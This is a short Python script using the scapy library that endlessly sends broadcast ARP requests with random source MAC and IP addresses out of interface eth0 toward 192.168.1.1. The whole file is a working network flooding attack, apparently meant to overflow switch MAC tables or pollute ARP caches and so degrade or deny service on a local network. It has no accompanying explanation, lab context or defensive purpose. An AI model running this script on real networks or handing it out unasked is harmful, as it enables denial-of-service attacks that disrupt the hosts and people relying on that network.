from scapy.all import *
import time

iface = "eth0"

while True:
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC()) / ARP(
        op=1,
        hwsrc=RandMAC(),
        psrc=RandIP(),
        hwdst="00:00:00:00:00:00",
        pdst="192.168.1.1"
    )
    sendp(pkt, iface=iface, verbose=False)